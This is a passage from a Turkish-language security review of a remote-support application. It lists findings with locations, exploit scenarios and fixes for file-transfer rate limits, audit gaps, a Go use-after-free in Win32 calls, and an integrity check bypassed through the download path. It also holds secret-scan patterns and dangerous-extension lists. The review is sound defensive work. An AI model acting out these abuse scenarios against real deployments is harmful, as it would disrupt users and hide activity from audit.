Sorun: DC `ctl` kanalında alıcı tarafta hız sınırı yok. Saniyede 50'den fazla teklif gelirse alıcı da saniyede 50'den fazla `file.meta` WS mesajı üretiyor (amplifikasyon). Sunucu, kurban tarafın soketini `ws_rate_exceeded` ile kapatıyor. Ayrıca her otomatik ret `list`'e ekleniyor (caps dışındakiler), bu da React render ve bellek yükünü sınırsız büyütüyor.
İstismar senaryosu: Kabul edilmiş müşteri (veya teknisyen), değiştirilmiş istemciyle döngüde `file.offer` yolluyor. Karşı tarafın WS'i kopuyor ve sinyalizasyon/ICE restart çalışmıyor. Sekme, binlerce satırlık listeyle yavaşlıyor. Kalıcı yetki kazancı yok. Ancak meşru tarafı "bağlantı koptu" durumuna düşürüyor ve S-P5-1'i besliyor.
Düzeltme: frontend-dev: S-P5-1'deki alıcı tarafı teklif sınırı. Aşımda `file.meta` gönderilmemeli ve `list`'e eklenmemeli. Otomatik ret kayıtları `list`'te en çok N (ör. 20) tutulmalı. Aynı zamanda `chat`/`annot.*` için de alıcı tarafı sınırı konmalı (bkz. S-P5-6). Sunucu tarafında değişiklik gerekmiyor (bucket doğru çalışıyor; sorun istemcinin karşı tarafın girdisini WS'e yansıtması).

### [ORTA] S-P5-3 `TO_TECH` kaydının tek kaynağı teknisyen istemcisi; değiştirilmiş konsol müşteriden dosya alıp hiç raporlamayabilir — A09 / A04

Yer: `apps/server/src/signaling/collab.ts:47-52` (gönderen raporu yok sayılıyor; tek kaynak alıcı); `packages/contracts/src/ws.ts` `fileMetaSchema` yorumu
Sorun: İçerik P2P aktığı için sunucu transferi göremiyor. `TO_TECH` yönünde rapor yalnız teknisyenden kabul ediliyor. Müşteri tarafının (gönderen) raporu atılıyor. İçeriden kötü niyetli bir teknisyen, `file.meta` göndermeyen bir konsolla müşteriden veri çekebilir ve hiçbir iz kalmaz. Bu, A09'un "denetlenen kişinin kendi kaydını yazması" durumudur.
İstismar senaryosu: Teknisyen tarayıcı konsolunda `sendMeta`'yı no-op yapıyor ve müşteriye "şu log dosyasını gönderin" diyor. `session_files`/`audit_logs` boş kalıyor.
Düzeltme: mimar + backend-dev: Gönderenin raporu da ayrı bir alan/satır olarak kaydedilmeli (ör. `reporter` = `sender|receiver`). Sunucu, alıcı raporu yoksa en azından gönderenin "offer/done" iddiasını audit'e yazmalı. Müşteri istemcisi değiştirilmemiş varsayıldığından bu, teknisyene karşı güvenilir iz sağlar. Mimari §4'te tasarım sapması/risk kabulü olarak işlenmeli.

### [DÜŞÜK] S-P5-4 Alınan dosya tamamen bellekte; SHA-256 için ikinci kopya — A04 (istemci DoS)

Yer: `apps/web/lib/dc/files.ts:279,287-289` (`chunks[]` → `Blob` → `sha256Hex` içinde `blob.arrayBuffer()`); gönderen `files.ts:161` (`sha256Hex(file)` dosyanın tamamını okuyor)
Sorun: Tenant sınırı 2048 MiB'a kadar çıkabiliyor. Bu durumda alıcıda yaklaşık 2× dosya boyutu RAM gerekiyor, `arrayBuffer()` ≥ 2 GB'ta hata verip sekmeyi çökertebilir. Gönderen de aynı şekilde etkileniyor. Kullanıcı kabulü gerektiği ve varsayılan 100 MB olduğu için düşük.
Düzeltme: frontend-dev: Artımlı özet (ör. `hash-wasm` veya parça parça SHA-256), alıcıda `chunks` yerine OPFS/`FileSystemWritableFileStream` (destek yoksa ≤ 256 MB üst sınır). Kısa vadede UI'da tenant sınırı 512 MB üzerindeyse uyarı gösterilebilir.

### [DÜŞÜK] S-P5-5 İndirme Blob'u MIME türü olmadan oluşturuluyor — A05 Security Misconfiguration

Yer: `apps/web/lib/dc/files.ts:287,291`; `components/collab/files-panel.tsx:42`
Sorun: `new Blob(chunks)` → `type=""`. `download` özniteliği tıklamada dosyayı indiriyor, ama kullanıcı bağlantıyı "Yeni sekmede aç" ile açarsa `blob:` URL'si uygulama origin'inde gezinir. Bu durumda tarayıcı türü koklayarak (sniffing) HTML/SVG içeriği belge olarak çizebilir. CSP (nonce + strict-dynamic, `proxy.ts:20`) blob belgelerine miras kaldığı için betik çalışması bugün engelleniyor. Ancak HTML ile oltalama/sahte form çizilebilir.
Düzeltme: frontend-dev: `new Blob(chunks, { type: "application/octet-stream" })`. İndirme bağlantısında tehlikeli/çift uzantı uyarısı da tekrar gösterilmeli (şu an yalnız kabul diyaloğunda).

### [DÜŞÜK] S-P5-6 Gelen `chat` / `annot.*` için alıcı tarafında hız sınırı yok — A04

Yer: `apps/web/lib/dc/use-collab.ts:57,62`; `lib/dc/annot.ts:58,64`; `lib/dc/chat.ts:31-32`
Sorun: Protokolde lazer için 30/sn tanımlı, ama yalnız gönderen uyguluyor. `MAX_STROKES` 200 × 500 nokta tavanı ve `CHAT_KEEP` 500 belleği sınırlıyor. Ancak her mesaj tam yeniden çizim/render tetikliyor ve chat yineleme kontrolü O(n). Değiştirilmiş teknisyen istemcisi müşteri sekmesini kilitleyebilir.
Düzeltme: frontend-dev: Alıcıda token bucket uygulanmalı (chat 5/sn, stroke 20/sn, laser 30/sn), aşanlar düşürülmeli.

### [DÜŞÜK] S-P5-7 Tehlikeli uzantı listesi ve Windows ayrılmış ad kapsamında boşluklar — A04

Yer: `packages/contracts/src/files.ts:15,46-50`
Sorun: Listede şunlar yok: `vbe, jse, ws, wsh, msp, mst, inf, ps1xml, psd1, psc1, settingcontent-ms, library-ms, searchconnector-ms, xlam, pptm, dotm, xla, gadget, html, htm, mht, svg` (son dördü tarayıcıda açılıp HTML smuggling/oltalama için kullanılır). `RESERVED` regex'i `CONIN$`, `CONOUT$` ve üst simge rakamlı `COM¹-³`/`LPT¹-³` adlarını kapsamıyor (Windows bunları da ayrılmış sayar). Yol geçişi, RTLO/Cf, sondaki nokta/boşluk, ADS `:` ve uzunluk doğru ele alınıyor. DB CHECK aynı kuralı tekrarlıyor.
Düzeltme: frontend-dev/backend-dev (contracts + fixtures + Go eşi birlikte): listeyi genişletin, regex'i `^(CON|PRN|AUX|NUL|CONIN\$|CONOUT\$|COM[1-9¹²³]|LPT[1-9¹²³])$` yapın.

### [DÜŞÜK] S-P5-8 JS `\p{Cf}` ile MySQL ICU `\p{Cf}` sürüm farkı `file.meta` yazımını düşürebilir — A09

Yer: `collab.ts:66,81-86`; migration `session_files_file_name_chk`
Sorun: Node ve MySQL farklı Unicode sürümleri kullanıyor. Yeni eklenen bir Cf karakteri bir tarafta silinir, diğerinde silinmezse CHECK 3819 hatası verir ve TX geri alınır. Bu durumda kayıt ve audit olmuyor, yalnız log kalıyor (sessiz kayıp, S-P5-1 ile aynı sonuç).
Düzeltme: backend-dev: CHECK hatasında adı `FILE_NAME_FALLBACK` ile değiştirip yeniden yazın (kayıt kaybolmasın) ve metrik artırın.

### Doğrulanan/olumlu (P5)

- **Sunucu `file.meta`:** caps (`file_transfer`) kontrolü `room.caps` üzerinden yapılıyor (sunucu hesaplı, admit anında). Yalnız alıcı tarafın raporu kabul ediliyor. Misafir için `ADMITTED`, teknisyen için `room.admitted` şartı var. Ad sunucuda yeniden temizleniyor. `OK` raporunda tenant sınırı kontrol ediliyor. `session_files` + `audit_logs` tek TX'te yazılıyor. `tenantId`/`sessionId` istemciden değil oda durumundan geliyor (tenant izolasyonu tamam). Hata yanıtında stack/SQL yok (ref'li log).
- **`quality.summary`:** yalnız teknisyenden kabul ediliyor, zod ile sınırlı sayılar ve enum, 5 sn yazma aralığı, 4 KB tavan. `updateMany` `tenantId + consumedAt not null` filtreli. DB CHECK ile eşleşiyor.
- **DC şemaları:** strict, `ctl` 16 KB, chat 2000 karakter, stroke 500 nokta, koordinatlar [0,1], `idx` uint16, sha256 regex, boyut tavanı. Çerçeve çözümlemede boyut kontrolü yapılıyor. `FileReceiveGuard` beyana güvenmiyor (`min(declared, max)`), sıra dışı parçada iptal ediyor, tamamlanma = alınan baytın beyana eşitliği, ardından SHA-256 eşleşmesi. Bozuk dosya sunulmuyor.
- **Kabul diyaloğu:** otomatik kabul yok. 1,5 sn sonra etkinleşme fid başına ayrı. Varsayılan odak "Reddet". Esc reddediyor. Tek bekleyen teklif var, diğerleri "busy" olarak reddediliyor. 30 sn ret bekleme süresi uygulanıyor. Tehlikeli/çift uzantı uyarısı gösteriliyor. İndirme adı temizlenmiş ad (`download={x.name}`). Object URL'ler `dispose`'ta bırakılıyor.
- **Chat XSS:** React metin düğümü kullanılıyor. `apps/web` içinde `dangerouslySetInnerHTML`/`innerHTML`/`eval` yok. Document PiP yalnız aynı origin stil düğümlerini kopyalıyor, dış içerik enjekte etmiyor.
- **Caps yokken düşürme:** güvenlik sınırı her iki uçta değiştirilmemiş kurban istemcisinde (müşteri: sunucunun `hello.caps`'i; konsol: kendi yetkisi) ve sunucuda meta için uygulanıyor. İçerik sunucudan geçmediği için bu, mimariyle uyumlu.
- **Kapanan P4 bulguları:** **S-P4-T3-1 kapandı.** `savedAt` + 120 sn, gelecek damga toleransı 5 sn, canlı oturumda 30 sn'de bir ve `pagehide`'da tazeleniyor (`guest-resume.ts`, `guest-session.tsx:60-70`). **S-P4-T3-2 kapandı.** 35 × 3 sn = 105 sn, `reconnect.conflict` audit'i oda başına dakikada 1 (`ws.ts:23,149`).
- **Migration/grants:** `app` için `session_files` yalnız SELECT/INSERT (append-only, REVOKE ile). CHECK'ler yön/sonuç/sha/boyut/ad için tanımlı. FK `(session_id, tenant_id)` bileşik, bu da çapraz tenant satırını DB'de engelliyor. Dosya içeriği tabloda yok.

### Otomatik tarama (P5)

- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması (`git diff` + izlenmeyen tüm yeni dosyalar, api_key/secret/password/token/özel anahtar/AKIA/ghp_ kalıpları) → eşleşme yok.
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S-P5-4 (akışlı özet/OPFS), S-P5-6 (alıcı tarafı hız sınırı), S-P5-7 (uzantı listesi), S-P5-8 (CHECK geri dönüşü). S-P5-1 bu turda düzeltilmeli. S-P5-2 ve S-P5-3 tercihen bu pakette düzeltilmeli; S-P5-3 için en azından mimariye risk kabulü yazılmalı.

---

## P5 kod turu 2 (S-P5-1..8 kapanış doğrulaması + yeni yüzeyler)

Tarih: 2026-11-11 · Kapsam: `apps/server/src/signaling/{collab,handlers,types,rooms}.ts`, `packages/contracts/src/{files,ws}.ts`, `apps/web/lib/dc/{files,rate,sha256,use-collab}.ts`, `components/collab/files-panel.tsx`, testler (`p5-guvenlik.test.ts`, `signaling-collab-p5*.test.ts`)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4

### Tur 1 bulgularının kapanışı

| Bulgu           | Durum                                 | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| --------------- | ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S-P5-1 (Yüksek) | **Kapandı**                           | `collab.ts:29-56` kota anahtarı `taraf:sınıf`; `accepted` (OK/CORRUPT) 60/dk, 2000/oturum, `declined` 20/dk, 500/oturum. Ret seli OK kotasını tüketemiyor. Teknisyen de müşterinin kotasını tüketemiyor, çünkü taraf soketten belirleniyor (`handlers.ts:78,119`) ve mesajdan gelmiyor. Aşımda `file.meta.rate_limited` audit'i yazılıyor (`collab.ts:88,125-135`). İstemci tarafında teklif sınırı 3/10 sn ve fazlası sessizce düşüyor (`files.ts:426`). Karşı tarafın tetiklediği meta tekilleştiriliyor ve dakikada en çok 5 (`files.ts:288-295`). Test: "21 sahte teklif + gerçek transfer → OK raporu" (web) ve "21 ret + OK → kayıt" (server int). |
| S-P5-2 (Orta)   | **Kapandı**                           | Aşan teklif ctl reddi, meta veya liste kaydı üretmiyor. `KEEP` 100, `AUTO_KEEP` 20 (`files.ts:253-276`). Amplifikasyon yok (≤ 5 meta/dk, WS bucket 50/sn).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| S-P5-3 (Orta)   | **Risk azaltıldı (kabul edilebilir)** | Gönderen raporu `file.transfer.sender_report` audit'ine yazılıyor (`collab.ts:97-102`). Müşteri istemcisi her gönderimde rapor veriyor (`files.ts:297-303`). Değiştirilmiş konsol `TO_TECH` raporunu bastırsa da müşteri tarafının izi kalıyor. Kalan boşluk için bkz. S-P5-T2-4.                                                                                                                                                                                                                                                                                                                                                                        |
| S-P5-4 (Düşük)  | **Kapandı**                           | Özet artımlı hesaplanıyor (`sha256.ts`). Alıcı, parçalar gelirken özetliyor (`files.ts:480`). Bellekte tek kopya tutuluyor (8 MB Blob grupları). 256 MB üstünde disk akışı var.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| S-P5-5 (Düşük)  | **Kapandı**                           | `files.ts:99` `application/octet-stream`. Tehlikeli uzantı uyarısı indirme satırında tekrarlanıyor (`files-panel.tsx:41`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| S-P5-6 (Düşük)  | **Kapandı**                           | `rate.ts` chat 5/sn, annot 30/sn, lazer 30/sn. `use-collab.ts:59` işlemeden önce düşürüyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| S-P5-7 (Düşük)  | **Kapandı**                           | `files.ts:16,48-54` istenen uzantıların tamamı ve `CONIN$`/`CONOUT$`/`COM¹-³`/`LPT¹-³` eklendi. Fixture genişletildi. AC-36 metninin revizyonu proje yöneticisinde (doküman işi).                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| S-P5-8 (Düşük)  | **Kapandı**                           | `isCheckViolation` (`collab.ts:59-63`), adaptör kaynağıyla tutarlı (`@prisma/adapter-mariadb` varsayılan dal `{kind:"mysql", code: errno}`). CHECK reddinde `file.meta.rejected_by_db` audit'i yazılıyor, ad yerine yer tutucu kullanılıyor, sha256/boyut korunuyor, istemciye `VALIDATION` dönüyor. Gerçek MySQL ile entegrasyon testi var (`signaling-collab-p5-dbcheck.test.ts`).                                                                                                                                                                                                                                                                     |

### Yeni yüzeyler: inceleme

- **Elle yazılmış SHA-256:** Doğru. Projedeki test WebCrypto ile 11 boyutta ve 37 baytlık parçalarla karşılaştırıyor. Ek olarak bu turda Node `crypto` ile karşılaştırıldı: 0–300 bayt arası tüm boyutlar rastgele 1–70 baytlık parçalarla, 1 MiB, 1 MiB+55, 5 MiB+63 ve boş girdi denendi, **0 uyuşmazlık**. 64 MB yaklaşık 260 ms sürüyor. 2^32 bit üstü uzunluk kodlaması (`hex()` hi/lo) doğru. `hex()` durumu değiştiriyor, yani ikinci çağrı farklı sonuç verir. Kodda her transferde yalnız bir kez çağrılıyor (`files.ts:46,492`). Risk yok ama sınıfa "tek kullanımlık" notu düşülmeli. Özet bütünlük amaçlı kullanılıyor, gizli anahtar içermiyor. Bu yüzden yan kanal (sabit zamanlı olmama) önemsiz.
- **Gönderen/alıcı sahteciliği (sunucu):** Taraf (`tech`/`guest`) kimliği doğrulanmış soketten geliyor. Mesajdaki `direction` yalnız "alıcı mı gönderen mi" yolunu seçiyor. Bir taraf diğerinin adına satır yazamıyor. `session_files`'a yalnız `from.side === receiver` olan rapor giriyor. Kotalar taraf başına ayrıldığı için karşı tarafın OK kotası tüketilemiyor. Müşterinin `accepted` sınıfı yalnız kullanıcı kararlarıyla doluyor: kabul edilmiş transfer veya müşterinin başlattığı gönderim (`files.ts:415-419`, transfer başına bir kez).
- **`sender_report` ile audit şişirme:** Sınırlı ama yüksek tavanlı (S-P5-T2-3).
- **`showSaveFilePicker` disk yolu:** Doğrulanmamış içerik hedef adda kalıcılaşmıyor. Özet tutmazsa `abort()` çağrılıyor (`files.ts:119-131`), kayıt penceresi kullanıcı hareketi içinde açılıyor, iptalde teklif beklemede kalıyor. Kısmi dosya konusunda kalan riskler S-P5-T2-1'de.

### [DÜŞÜK] S-P5-T2-1 Disk akışı yolu test edilmemiş; seçim anında hedef dosya oluşuyor/eziliyor, çökmede kısmi `.crswap` kalabiliyor — A04 Insecure Design

Yer: `apps/web/lib/dc/files.ts:333-350` (`accept`), `files.ts:110-139` (`diskSink`); `files-panel.tsx:41,47` (uyarı ve indirme satırı `x.url` koşulunda)
Sorun:

1. Chromium, `showSaveFilePicker` seçimi yapıldığı anda hedef yolda dosyayı oluşturuyor. Mevcut bir dosya seçildiyse onu boşaltıyor. Tarayıcıda ayrıca doğrulanmalı. Bu durumda `abort()` sonrası içerik yazılmıyor ama hedefte 0 baytlık bir dosya kalıyor. Kullanıcı "üzerine yaz" dediyse eski dosya kaybolmuş oluyor.
2. Yazımlar `close()`'a kadar `<ad>.crswap` geçici dosyasında tutuluyor. Sekme veya tarayıcı çökerse ya da süreç öldürülürse, doğrulanmamış ve saldırganın kontrolündeki kısmi içerik diskte kalabiliyor (ad `.crswap` olduğu için doğrudan çalıştırılamaz).
3. Disk yolunda `url` olmadığından tamamlanan satırda tehlikeli/çift uzantı uyarısı tekrar gösterilmiyor (S-P5-5'in disk eşi).
4. Yol için birim testi de e2e testi de yok (`grep showSaveFilePicker|diskSink` test dosyalarında eşleşmiyor).
   İstismar senaryosu: Teknisyen 300 MB'lık bir dosyayı yanlış özetle teklif ediyor. Kullanıcı kayıt yeri olarak var olan bir dosyayı seçiyor. Transfer "bozuk" bitiyor ama kullanıcının eski dosyası 0 bayta inmiş oluyor. Kod çalıştırma yok, etki veri kaybı veya kafa karışıklığı ile sınırlı.
   Düzeltme: frontend-dev:

- `diskSink` için sahte `WritableLike` ile birim testi yazılmalı: özet tutmazsa `close` çağrılmamalı, `abort` çağrılmalı; iptalde `discard` → `abort`.
- Kabul diyaloğundaki disk bilgisine (`p5.files.bigDisk`) "mevcut dosyanın üzerine yazmayın; doğrulama başarısız olursa boş dosya kalabilir" uyarısı eklenmeli.
- `ok` + `dir=in` + `dangerous` satırında uyarı `url` koşulsuz gösterilmeli.
- İsteğe bağlı: doğrulama başarısız olursa kullanıcıya "boş dosyayı silin" bildirimi gösterilmeli (FSA `remove()` destekleniyorsa `handle.remove()` çağrılabilir).

### [DÜŞÜK] S-P5-T2-2 `file.meta.rate_limited` audit seyreltmesi taraf ayrımı yapmıyor; bir taraf diğerinin aşım kaydını bastırabilir — A09

Yer: `apps/server/src/signaling/collab.ts:125-129` (`room.fileMeta.auditAt[cls]`; anahtar yalnız sınıf), `types.ts:92`
Sorun: Kota `taraf:sınıf` başına tutuluyor, ama aşım audit'inin dakikalık seyreltmesi yalnız `sınıf` başına. Teknisyen, WS'ten doğrudan 21 adet `declined` meta göndererek her dakika kendi aşımını tetikleyebiliyor. Bu durumda aynı dakika içinde müşteri tarafında oluşan `declined` aşımı audit'e yazılmıyor, yalnız log ve metrik kalıyor.
İstismar senaryosu: Müşterinin `declined` kotası tükenmiş olmalı. Bunun için ya müşteri tarafı sınırıyla (5/dk) 100 dakikalık uzun bir oturum gerekir ya da müşteri gerçekten çok ret üretmiş olmalı. Bu ön koşul sağlandığında müşteri elle yaptığı ret/iptal raporlarının düşürüldüğü audit'te görünmez. Etkisi dar, çünkü reddedilen dosya hiç inmemiş oluyor.
Düzeltme: backend-dev: `auditAt` anahtarını `${side}:${cls}` yapın. Integration testine "teknisyen aşımı + misafir aşımı aynı dakikada → 2 satır" senaryosunu ekleyin.

### [DÜŞÜK] S-P5-T2-3 `sender_report` ve kota tavanları ile audit tablosu şişirilebiliyor — A04 / A09

Yer: `apps/server/src/signaling/collab.ts:14-18,97-102`
Sorun: Gönderen raporu da kotadan yer yiyor. Ancak tavanlar yüksek: taraf başına `accepted` 60/dk + `declined` 20/dk, yani dakikada 80 ve oturum başına 2500 audit satırı. Değiştirilmiş konsol, sahte `TO_CUSTOMER` "OK" gönderen raporlarıyla hiçbir transfer yapmadan bu tavana ulaşabiliyor (sunucu gönderen raporunu herhangi bir transferle eşleştirmiyor). Kendi başlattığı N eşzamanlı oturumla (misafiri kendisi kabul ederek) bu sayı N katına çıkıyor. Satırlar teknisyenin `userId`'siyle atfedilebilir ve tenant içi, bu yüzden düşük.
İstismar senaryosu: İçeriden kötü niyetli bir teknisyen, audit ekranını gürültüyle doldurarak gerçek bir olayı gömmeye çalışıyor (örneğin 10 oturum × 80/dk = 800 satır/dk).
Düzeltme: backend-dev:

- Gönderen raporu için ayrı ve düşük bir sınıf tanımlanmalı (ör. `sender` 10/dk, 200/oturum). Meşru akışta bu, transfer başına 1 rapor demek.
- Teknisyen başına tüm odalardaki `file.meta` toplamı için bir sayaç ya da `rs_file_meta_total{result="sender_reported"}` oran alarmı eklenmeli (runbook).
- Audit ekranında `action` filtresiyle bu gürültü ayıklanabildiği için acil değil.

### [DÜŞÜK] S-P5-T2-4 `session_files` satırı raporlayanı taşımıyor; gönderen ve alıcı raporları eşleştirilmiyor — A09 (bilgi / risk kabulü)

Yer: `collab.ts:104-110` (satırda raporlayan yok), migration `session_files`
Sorun: Alıcı raporu tek kaynak. Değiştirilmiş müşteri istemcisi `TO_CUSTOMER` yönünde sahte bir "teknisyen `x.exe` gönderdi, OK" satırı yazabiliyor (tur 1'den beri tasarım gereği böyle). Audit satırındaki `username: "customer"` bu kaydı ayırt ediyor. Ancak yalnız `session_files`'ı okuyan bir rapor ya da ekran (P12/P13) bunu olgu olarak gösterir. Gönderen raporu ile alıcı raporu arasında `fid` bağı yok, sunucu "iki taraf da aynı sha256'yı bildirdi mi" kontrolünü yapamıyor.
Düzeltme: mimar: Rapor ekranı tasarlanırken `session_files` audit'teki actor ile birleştirilmeli veya `reporter` kolonu eklenmeli. `file.meta`'ya `fid` eklenerek gönderen ve alıcı raporlarının eşleşmesi gösterilmeli ("doğrulanmış/tek taraflı"). P12/P13 kapsamında ele alınabilir. Şimdilik risk kabulü olarak `docs/mimari-protokol.md` §3'e not düşülmeli.

### Olumlu (tur 2)

- Kota kontrolü, gönderen/alıcı ayrımından önce ve `too_large` kontrolünden sonra yapılıyor. Yetkisiz (`caps`) meta kota tüketmiyor.
- `rejectedByDb` ve `auditRateLimited` kendi hatalarını yakalıyor ve `ref` ile logluyor. Hata yanıtlarında stack veya SQL yok.
- İstemcide teklif sınırı, meta tekilleştirmesi, liste sınırı ve chat/annot sınırı birim testleriyle kapsanmış. `lib/dc` testleri bu turda yeniden çalıştırıldı: **23/23 geçti**.
- Disk yolunda kayıt penceresi `await`'ten önce ve kullanıcı hareketi içinde çağrılıyor. Seçim sürerken teklif iptal edilirse yazıcı `abort` ediliyor (`files.ts:341`).
- `verify` tek sefer çalışıyor (durum `receiving` → `verifying` eşzamanlı geçiyor). `hex()` çift çağrılmıyor.

### Otomatik tarama (P5 tur 2)

- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması: `git diff` eklenen satırlar, izlenmeyen tüm dosyalar ve P5 dizinleri (`signaling`, `contracts/src`, `contracts/fixtures`, `lib/dc`, `components/collab`, `e2e/p5-collab.spec.ts`) api_key/secret/password/token (≥ 8 karakter değer), AKIA, ghp_ ve özel anahtar kalıplarıyla tarandı → **eşleşme yok** (tek isabet, bu raporun önceki turdaki açıklama satırı).
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S-P5-T2-1 (disk yolu testi ve uyarı), S-P5-T2-2 (`auditAt` taraf anahtarı, küçük düzeltme, bu pakette yapılabilir), S-P5-T2-3 (gönderen raporu için ayrı düşük kota ve alarm), S-P5-T2-4 (raporlayan ve `fid` eşleşmesi, P12/P13). P5 için güvenlik kapısı açık: Kritik/Yüksek 0.

## P6 kod turu 1 — Windows istemcisi, indirme ucu, CI/yayın (2026-11-11)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 7

Kapsam, commit edilmemiş P6 değişiklikleridir: `apps/agent-win/**`, `apps/server/src/public/{routes,agent,agent-binary}.ts`, `sessions/public.ts`, `sessions/repo.ts`, `lib/logger.ts`, `deploy/{Caddyfile,docker-compose.yml}`, `deploy/agent/verify-and-publish.sh`, `.github/workflows/{agent-win,agent-watch}.yml`, `.github/dependabot.yml` ve `.env.example`.
Not: Tur sınırı nedeniyle `capture/` (DXGI/MF) kodu yalnız `unsafe.Slice` noktalarında örneklendi. `ui/screens_windows.go` ve `ui/form_windows.go` satır satır okunmadı.

### Bulgular (öncelik sırasıyla)

#### S6-1 [ORTA] Win32 metin işaretçisi `uintptr`'a yardımcı fonksiyonda çevriliyor, bu yüzden GC tamponu çağrıdan önce serbest bırakabilir (use-after-free) — A08 / bellek güvenliği

Yer: `apps/agent-win/internal/win/win_windows.go:240` (`func ptr(s string) uintptr { return uintptr(unsafe.Pointer(Str(s))) }`). Kullanım yerleri: `:265` (CreateWindowExW, iki `ptr` arka arkaya), `:317` (`SendMessageStr`: EM_REPLACESEL/LB_ADDSTRING), `:320` (`SetText`), `:335` (MessageBox), `:438` (DrawText), `:459` (CreateFont) ve `:513` (ShellExecute `mailto:`).
Sorun: `unsafe.Pointer` kuralı (4) gereği `uintptr` dönüşümü `Proc.Call(...)` argüman listesinin içinde yazılmalıdır. Ancak o zaman derleyici (`//go:uintptrescapes`) nesneyi çağrı bitene kadar canlı tutar. Burada dönüşüm ayrı bir fonksiyonda yapılıyor ve `ptr` döndükten sonra UTF-16 tampona hiçbir referans kalmıyor. Bu durumda iki sorun çıkabilir:

- Pion ve yakalama goroutine'leri sürekli bellek ayırıyor. GC araya girerse tampon serbest kalır ve yeniden kullanılır. Win32 çağrısı başka bir nesnenin baytlarını okur ve NUL bulana kadar okumayı sürdürebilir (taşma okuması).
- `CreateWindow` içinde ikinci `ptr` çağrısının yaptığı bellek ayırma, ilk tamponu tek başına geçersiz kılabilir.
  İstismar senaryosu: Tamponun içeriği teknisyen tarafından kontrol edilebiliyor. Örneğin `chat` metni (≤2000 UTF-16) EM_REPLACESEL ile gösteriliyor. Yoğun video sırasında teknisyen art arda chat gönderirse, müşteri ekranında başka heap verisi görünebilir (ör. TURN credential, reconnectToken parçaları) ya da istemci çöker. Güvenilir bir kod yürütme yolu görülmedi. Etki: müşteri tarafında DoS ve bellek içeriğinin ekrana sızması. Olasılık düşük ama gerçek.
  Düzeltme (backend-dev): `ptr` kaldırılmalı. `Str(s)` `*uint16` döndürmeli ve dönüşüm çağrı ifadesinin içinde yapılmalı: `p := Str(s); pX.Call(h, uintptr(unsafe.Pointer(p)))`. Alternatif olarak çağrıdan sonra `runtime.KeepAlive(p)` eklenmeli. `go vet` bu durumu yakalamaz; bu yüzden `win` paketine "`uintptr(unsafe.Pointer(` yalnız `.Call(` satırında" diye bir grep testi eklenmeli.

#### S6-2 [ORTA] SHA-256 bütünlük kapısı yalnız 302 yönlendirmesinde var; asıl dağıtım yolu `/downloads/*` kapıyı atlıyor — A08 (G-07, T13)

Yer: `deploy/Caddyfile` `@agentExe` bloğu (`handle @agentExe { root * /srv/downloads … file_server }`), `apps/server/src/public/agent.ts:50`, `.github/workflows/agent-watch.yml:41`
Sorun: Mimari §8.1 ve T13 "uyuşmazlıkta indirme 503 (fail-closed)" diyor. Kodda ise `AgentBinary.check()` yalnız `GET /api/v1/public/agent/download` yanıtını etkiliyor. Caddy `/downloads/NoktaDestek.exe` ve `/downloads/Destek-<herhangi 8 hane>.exe` yollarındaki dosyayı hash kontrolü yapmadan, kimlik ve ref istemeden doğrudan sunuyor. Volume'daki dosya `AGENT_SHA256` ile uyuşmasa bile (yarım yayın, elle kopya, tahrif) dağıtım sürüyor. Ayrıca `agent-watch` doğrudan Caddy yolunu izliyor ve Caddy hiçbir zaman 503 dönmüyor, dolayısıyla `server503` dalı ölü kod. Gözcü uyuşmazlığı yine de hash karşılaştırmasıyla yakalar, ancak bu ertesi gün olur.
İstismar senaryosu: Sunucuda volume'a yazabilen ama `.env`'e dokunamayan bir aktör ya da hatalı bir operatör adımı volume'a farklı bir exe koyar. Uç 503 döner ama müşterilere daha önce iletilmiş `/downloads/...` bağlantıları değiştirilmiş ikiliyi sunmaya devam eder. Alarm ancak 24 saate kadar sonra gelir.
Düzeltme (devops + backend-dev): Caddy `@agentExe` bloğunun önüne `forward_auth server:3001 { uri /api/v1/public/agent/ready }` eklenmeli. Bu iç uç `agentBinary.check()` "ok" değilse 503 döner. Alternatif: dosya sunucudan akıtılmalı. `agent-watch` hem doğrudan yolu hem de `?ref`'siz 503 kontrolünü yapmalı ya da ölü dal kaldırılmalı. Kalan risk (sunucunun tümüyle ele geçirilmesi) G-07 sadeleştirmesiyle kabul edilmişti; bu bulgu yalnız "fail-closed" vaadinin gerçek dağıtım yolunda da sağlanmasıyla ilgili.

#### S6-3 [DÜŞÜK] MOTW, yeniden adlandırmadan sonra yazılıyor; yazılamazsa dosya MOTW'suz kalıyor; `os.Rename` üzerine yazıyor — A08 (G-06)

Yer: `apps/agent-win/internal/transfer/transfer.go:189-210`, `internal/files/motw_windows.go:13`
Sorun:

- Nihai ad (ör. `.exe`) önce MOTW'suz oluşuyor, `Zone.Identifier` ondan sonra ekleniyor (kısa bir pencere).
- NTFS dışı birimde MOTW hatası yalnız `MOTWFailed` uyarısına dönüşüyor. Tehlikeli uzantılı dosya SmartScreen koruması olmadan Downloads'ta kalıyor.
- Windows'ta `os.Rename`, `MoveFileEx(MOVEFILE_REPLACE_EXISTING)` kullanıyor. Bu yüzden `Lstat` ile `Rename` arasında aynı adla oluşan bir dosyanın üzerine yazılıyor. Bu, "üzerine yazma yok" kuralıyla çelişiyor (TOCTOU).
  İstismar senaryosu: Etki sınırlı. Kullanıcı aynı anda tarayıcıdan aynı adla bir dosya indirirse o dosya kaybolur. FAT32/exFAT USB'ye yönlendirilmiş bir Downloads klasöründe teknisyenin gönderdiği `.exe` MOTW'suz çalıştırılabilir.
  Düzeltme (backend-dev):
